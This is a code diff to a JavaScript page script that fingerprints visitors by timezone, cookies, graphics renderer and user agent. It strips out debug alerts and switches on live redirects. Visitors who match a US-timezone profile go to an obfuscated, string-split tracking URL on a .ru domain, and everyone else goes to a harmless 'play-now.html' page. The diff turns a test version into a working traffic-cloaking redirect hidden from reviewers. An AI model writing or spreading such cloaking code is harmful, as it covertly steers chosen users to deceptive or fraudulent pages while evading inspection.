@@ -77,25 +77,16 @@
 	let tz = new Date().getTimezoneOffset()/-60;
 	const tzmin = -8;
 	const tzmax = -4;
-	alert(tz);
 	if ((tz >= tzmin) && (tz <= tzmax)) {
 		var mytz = 1;
 	}
 	
-	alert(ucookies);
-	alert(myrenderer);
-	alert(renderer);
-	alert(myuseragent);
-	alert(mytz);
-	
 	if ((ucookies==1) && (myrenderer==1) && (myuseragent==1) && (mytz==1)) {
 		var url = 'htt'+'p:/'+'/tr'+'ck.p'+'lsy'+'.ru/cl'+'ic'+'k?pi'+'d=2'+'6&o'+'ff'+'er_'+'id=1'+'3'+'7&s'+'ub'+'2=0'+'2'+'6G'+'&'+'s'+'ub'+'3='+utm_term;
-		//window.location.href = url;
-		alert(url);
+		window.location.href = url;
 	} else {
 		var url = "play-now.html";
-		//setTimeout( 'location="' + url + '";', 3000 );
-		alert(url);
+		setTimeout( 'location="' + url + '";', 3000 );
 	};	
 	
 	Cookies.remove('u');
